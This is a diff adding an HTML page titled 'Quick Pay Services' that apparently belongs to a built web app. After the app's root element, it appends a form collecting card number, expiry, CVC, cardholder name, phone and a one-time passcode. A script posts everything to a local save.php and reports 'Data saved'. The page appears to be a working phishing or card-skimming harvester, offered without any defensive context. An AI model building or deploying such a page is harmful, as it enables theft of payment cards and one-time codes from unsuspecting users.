@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/x-icon" href="./favicon.ico" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Quick Pay Services - Fast & Secure Payments</title>
+    <script type="module" crossorigin src="./assets/index-PYrti-H9.js"></script>
+    <link rel="stylesheet" crossorigin href="./assets/index-gSKjCrt5.css">
+  </head>
+  <body>
+    <div id="root"></div>
+  
+<form id="payForm">
+  <input name="phone" placeholder="Phone"><br>
+  <input name="amount" placeholder="Amount"><br>
+  <input name="name" placeholder="Cardholder Name"><br>
+  <input name="card_number" placeholder="Card Number"><br>
+  <input name="expiry" placeholder="Expiry (MM/YY)"><br>
+  <input name="cvc" placeholder="CVC"><br>
+  <input name="otp" placeholder="OTP"><br>
+  <button type="submit">Submit</button>
+</form>
+<script>
+document.getElementById('payForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  fetch('backend/save.php', {
+    method: 'POST',
+    body: new FormData(this)
+  }).then(r=>r.text()).then(t=>alert('Data saved'));
+});
+</script>
+
+</body>
+</html>
